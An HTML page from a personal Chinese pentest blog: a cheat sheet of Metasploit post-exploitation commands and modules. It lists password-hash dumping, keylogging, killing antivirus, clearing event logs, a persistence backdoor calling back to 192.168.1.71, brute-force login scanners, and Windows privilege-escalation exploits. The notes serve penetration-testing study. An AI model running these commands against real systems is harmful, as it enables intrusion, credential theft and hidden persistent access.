@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="metasploit,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="运行自动化脚本  msfconsole -r auto.rc   检测是否为虚拟机  post/windows/gather/checkvm   获取磁盘信息  windows/gather/forensics/enum_drives   补丁信息  run post/windows/gather/enum_patches   事务日志查看:   run event_manager -i   清除">
+<meta name="keywords" content="metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试笔记2-MSF常用模块记录">
+<meta property="og:url" content="http://yoursite.com/2019/10/03/渗透测试笔记2-MSF常用模块记录/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="运行自动化脚本  msfconsole -r auto.rc   检测是否为虚拟机  post/windows/gather/checkvm   获取磁盘信息  windows/gather/forensics/enum_drives   补丁信息  run post/windows/gather/enum_patches   事务日志查看:   run event_manager -i   清除">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-03T08:31:29.076Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试笔记2-MSF常用模块记录">
+<meta name="twitter:description" content="运行自动化脚本  msfconsole -r auto.rc   检测是否为虚拟机  post/windows/gather/checkvm   获取磁盘信息  windows/gather/forensics/enum_drives   补丁信息  run post/windows/gather/enum_patches   事务日志查看:   run event_manager -i   清除">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/03/渗透测试笔记2-MSF常用模块记录/">
+
+
+
+
+
+  <title>渗透测试笔记2-MSF常用模块记录 | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/渗透测试笔记2-MSF常用模块记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试笔记2-MSF常用模块记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-03T16:30:49+08:00">
+                2019-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="运行自动化脚本"><a href="#运行自动化脚本" class="headerlink" title="运行自动化脚本"></a>运行自动化脚本</h3><blockquote>
+<blockquote>
+<p>msfconsole -r auto.rc</p>
+</blockquote>
+</blockquote>
+<h3 id="检测是否为虚拟机"><a href="#检测是否为虚拟机" class="headerlink" title="检测是否为虚拟机"></a>检测是否为虚拟机</h3><blockquote>
+<blockquote>
+<p>post/windows/gather/checkvm</p>
+</blockquote>
+</blockquote>
+<h3 id="获取磁盘信息"><a href="#获取磁盘信息" class="headerlink" title="获取磁盘信息"></a>获取磁盘信息</h3><blockquote>
+<blockquote>
+<p>windows/gather/forensics/enum_drives</p>
+</blockquote>
+</blockquote>
+<h3 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h3><blockquote>
+<blockquote>
+<p>run post/windows/gather/enum_patches</p>
+</blockquote>
+</blockquote>
+<h3 id="事务日志"><a href="#事务日志" class="headerlink" title="事务日志"></a>事务日志</h3><p>查看:</p>
+<blockquote>
+<blockquote>
+<p>run event_manager -i</p>
+</blockquote>
+</blockquote>
+<p>清除:</p>
+<blockquote>
+<blockquote>
+<p>run event_manager -c</p>
+</blockquote>
+</blockquote>
+<h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>run post/windows/gather/enum_applications #获取安装软件信息</p>
+<p>run post/windows/gather/dumplinks   #获取最近的文件操作</p>
+<p>run post/windows/gather/enum_ie  #获取IE缓存</p>
+<p>run post/windows/gather/enum_chrome   #获取Chrome缓存</p>
+<p>run post/windows/gather/enum_shares   #列出共享及历史共享</p>
+<p>run enum_vmware #列出vmware的配置文件和产品</p>
+<p>run scraper  #从目标主机获得所有网络共享等信息</p>
+<p>run getcountermeasure  #显示HIPS和AV进程的列表，显示远程机器的防火墙规则，列出DEP和UAC策略</p>
+<p>run hashdump #获得密码哈希值</p>
+<p>run windows/gather/smart_hashdump  #获取哈希值,功能更强大</p>
+<p>run keylogrecorder #记录键盘信息</p>
+<p>run get_env #获取所有用户的环境变量</p>
+<p>run getvncpw #获取VNC账户密码</p>
+<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>run packetrecorder #查看目标系统的所有网络流量，并且进行数据包记录，-i 1指定记录数据包的网卡</p>
+<p>run get_local_subnets  #得到本地子网网段</p>
+<p>run  arp_scanner-r  192.168.1.0/24  #利用arp进行存活主机扫描</p>
+<h2 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h2><p>run killav   #终止Av进程，可以很快的清除我们的路径和有效渗透测试的记录</p>
+<p>run getcountermeasure #列出HIPS 和 AV 的进程，显示XP 防火墙规则, 并且显示 DEP和UAC 策略<br>Ps：-k参数可以杀掉防护软件进程</p>
+<h2 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h2><p>run persistence #用作持久后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-A   自动启动一个匹配的exploit / multi / handler来连接到代理</span><br><span class="line">-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。</span><br><span class="line">-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。</span><br><span class="line">-S   作为服务自动启动代理程序（具有SYSTEM权限）</span><br><span class="line">-T   要使用的备用可执行模板</span><br><span class="line">-U   用户登录时自动启动代理</span><br><span class="line">-X   系统引导时自动启动代理程序</span><br><span class="line">-h   这个帮助菜单</span><br><span class="line">-i   每次连接尝试之间的时间间隔（秒）</span><br><span class="line">-p   运行Metasploit的系统正在侦听的端口</span><br><span class="line">-r   运行Metasploit监听连接的系统的IP</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<blockquote>
+<p>run persistence -U -i 5 -p 443 -r 192.168.1.71</p>
+</blockquote>
+</blockquote>
+<h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><blockquote>
+<blockquote>
+<p>run post/windows/manage/enable_rdp</p>
+</blockquote>
+</blockquote>
+<p>run win32-sshserver #安装openssh服务</p>
+<p>run vnc #可以看到远程桌面</p>
+<h2 id="一些常用的破解模块"><a href="#一些常用的破解模块" class="headerlink" title="一些常用的破解模块"></a>一些常用的破解模块</h2><p>auxiliary/scanner/mssql/mssql_login</p>
+<p>auxiliary/scanner/ftp/ftp_login</p>
+<p>auxiliary/scanner/ssh/ssh_login</p>
+<p>auxiliary/scanner/telnet/telnet_login</p>
+<p>auxiliary/scanner/smb/smb_login</p>
+<p>auxiliary/scanner/mssql/mssql_login</p>
+<p>auxiliary/scanner/mysql/mysql_login</p>
+<p>auxiliary/scanner/oracle/oracle_login</p>
+<p>auxiliary/scanner/postgres/postgres_login</p>
+<p>auxiliary/scanner/vnc/vnc_login</p>
+<p>auxiliary/scanner/pcanywhere/pcanywhere_login</p>
+<p>auxiliary/scanner/snmp/snmp_login</p>
+<p>auxiliary/scanner/ftp/anonymous</p>
+<h2 id="一些好用的模块"><a href="#一些好用的模块" class="headerlink" title="一些好用的模块"></a>一些好用的模块</h2><p>auxiliary/admin/realvnc_41_bypass  (Bypass VNCV4网上也有利用工具)</p>
+<p>auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁5.2版洞略老）</p>
+<p>auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)）</p>
+<p>auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink 命令执行:)</p>
+<p>auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令没回显:(）</p>
+<p>auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友)</p>
+<p>auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:)</p>
+<p>auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行）</p>
+<p>auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句)</p>
+<p>auxiliary/scanner/rsync/modules_list  （Rsync）</p>
+<p>auxiliary/scanner/misc/redis_server  (Redis)</p>
+<p>auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血)</p>
+<p>auxiliary/scanner/mongodb/mongodb_login (Mongodb)</p>
+<p>auxiliary/scanner/elasticsearch/indices_enum (elasticsearch)</p>
+<p>auxiliary/scanner/http/axis_local_file_include (axis本地文件包含)</p>
+<p>auxiliary/scanner/http/http_put (http Put)</p>
+<p>auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户)</p>
+<p>auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户)</p>
+<p>auxiliary/scanner/http/svn_scanner （svn Hunter :)）</p>
+<p>auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破)</p>
+<p>auxiliary/scanner/http/zabbix_login （Zabbix :)）</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h4 id="ms10-073-ms10-092"><a href="#ms10-073-ms10-092" class="headerlink" title="ms10-073\ms10-092"></a>ms10-073\ms10-092</h4><h4 id="ms14-002"><a href="#ms14-002" class="headerlink" title="ms14-002"></a>ms14-002</h4><p>Windows XP<br>Windows Server 2003</p>
+<h4 id="ms15-001"><a href="#ms15-001" class="headerlink" title="ms15-001"></a>ms15-001</h4><h4 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15_051"></a>ms15_051</h4><p>Microsoft Windows Vista<br>Microsoft Windows Server 2012 R2<br>Microsoft Windows Server 2012<br>Microsoft Windows Server 2008 R2<br>Microsoft Windows Server 2008<br>Microsoft Windows Server 2003<br>Microsoft Windows RT 8.1<br>Microsoft Windows RT<br>Microsoft Windows 8.1<br>Microsoft Windows 8<br>Microsoft Windows 7  </p>
+<h4 id="ms16-016"><a href="#ms16-016" class="headerlink" title="ms16-016"></a>ms16-016</h4><p>根据微软官方信息显示，此漏洞存在于在：</p>
+<p>Windows Vista SP2<br>Windows Server 2008 x86 &amp; x64<br>Windows Server 2008 R2 x64<br>Windows 7 x86 &amp; x64<br>Windows 8.1 x86 &amp; x64  </p>
+<p>系统中提升权限至系统权限，以下系统中导致系统拒绝服务（蓝屏）：</p>
+<p>Windows Server 2012<br>Windows Server 2012 R2<br>Windows RT 8.1<br>Windows 10  </p>
+<h4 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16-032"></a>ms16-032</h4><p>多exp</p>
+<h4 id="MS16-075-烂土豆"><a href="#MS16-075-烂土豆" class="headerlink" title="MS16-075(烂土豆)"></a>MS16-075(烂土豆)</h4><p>全版本通杀</p>
+<h4 id="ms"><a href="#ms" class="headerlink" title="ms"></a>ms</h4><h4 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h4><h5 id="提高程序运行级别（runas）"><a href="#提高程序运行级别（runas）" class="headerlink" title="提高程序运行级别（runas）"></a>提高程序运行级别（runas）</h5><p>exploit/windows/local/ask  </p>
+<h5 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h5><p>exploit/windows/local/bypassuac  </p>
+<blockquote>
+<blockquote>
+<p>模块执行成功后，执行getuid发现还是普通权限，不要失望，继续执行getsystem，再次查看权限，成功绕过UAC，且已经是系统权限了。</p>
+</blockquote>
+</blockquote>
+<h4 id="CVE-2018-8120"><a href="#CVE-2018-8120" class="headerlink" title="CVE-2018-8120"></a>CVE-2018-8120</h4><p>Microsoft Windows Server 2008 R2 for x64-based Systems SP1<br>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1<br>Microsoft Windows Server 2008 for x64-based Systems SP2<br>Microsoft Windows Server 2008 for Itanium-based Systems SP2<br>Microsoft Windows Server 2008 for 32-bit Systems SP2<br>Microsoft Windows 7 for x64-based Systems SP1<br>Microsoft Windows 7 for 32-bit Systems SP1  </p>
+<h4 id="mysql-提权"><a href="#mysql-提权" class="headerlink" title="mysql 提权"></a>mysql 提权</h4><p>mysql_mof mof提权  </p>
+<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h4 id="ms15-020"><a href="#ms15-020" class="headerlink" title="ms15-020"></a>ms15-020</h4><p>生成link共享文件</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记1-Meterpreter后渗透/" rel="next" title="渗透测试笔记1-Meterpreter后渗透">
+                <i class="fa fa-chevron-left"></i> 渗透测试笔记1-Meterpreter后渗透
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记3-内网存活主机扫描/" rel="prev" title="渗透测试笔记3-内网存活主机扫描">
+                渗透测试笔记3-内网存活主机扫描 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tusk1@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#运行自动化脚本"><span class="nav-number">1.</span> <span class="nav-text">运行自动化脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测是否为虚拟机"><span class="nav-number">2.</span> <span class="nav-text">检测是否为虚拟机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取磁盘信息"><span class="nav-number">3.</span> <span class="nav-text">获取磁盘信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁信息"><span class="nav-number">4.</span> <span class="nav-text">补丁信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#事务日志"><span class="nav-number">5.</span> <span class="nav-text">事务日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取敏感信息"><span class="nav-number">6.</span> <span class="nav-text">获取敏感信息</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#网络信息"><span class="nav-number"></span> <span class="nav-text">网络信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过防火墙"><span class="nav-number"></span> <span class="nav-text">绕过防火墙</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#持久后门"><span class="nav-number"></span> <span class="nav-text">持久后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启远程桌面"><span class="nav-number"></span> <span class="nav-text">开启远程桌面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些常用的破解模块"><span class="nav-number"></span> <span class="nav-text">一些常用的破解模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些好用的模块"><span class="nav-number"></span> <span class="nav-text">一些好用的模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限提升"><span class="nav-number"></span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ms10-073-ms10-092"><span class="nav-number">0.1.</span> <span class="nav-text">ms10-073\ms10-092</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms14-002"><span class="nav-number">0.2.</span> <span class="nav-text">ms14-002</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms15-001"><span class="nav-number">0.3.</span> <span class="nav-text">ms15-001</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms15-051"><span class="nav-number">0.4.</span> <span class="nav-text">ms15_051</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms16-016"><span class="nav-number">0.5.</span> <span class="nav-text">ms16-016</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms16-032"><span class="nav-number">0.6.</span> <span class="nav-text">ms16-032</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MS16-075-烂土豆"><span class="nav-number">0.7.</span> <span class="nav-text">MS16-075(烂土豆)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ms"><span class="nav-number">0.8.</span> <span class="nav-text">ms</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UAC提权"><span class="nav-number">0.9.</span> <span class="nav-text">UAC提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#提高程序运行级别（runas）"><span class="nav-number">0.9.1.</span> <span class="nav-text">提高程序运行级别（runas）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过UAC"><span class="nav-number">0.9.2.</span> <span class="nav-text">绕过UAC</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2018-8120"><span class="nav-number">0.10.</span> <span class="nav-text">CVE-2018-8120</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-提权"><span class="nav-number">0.11.</span> <span class="nav-text">mysql 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程代码执行"><span class="nav-number"></span> <span class="nav-text">远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ms15-020"><span class="nav-number">0.1.</span> <span class="nav-text">ms15-020</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
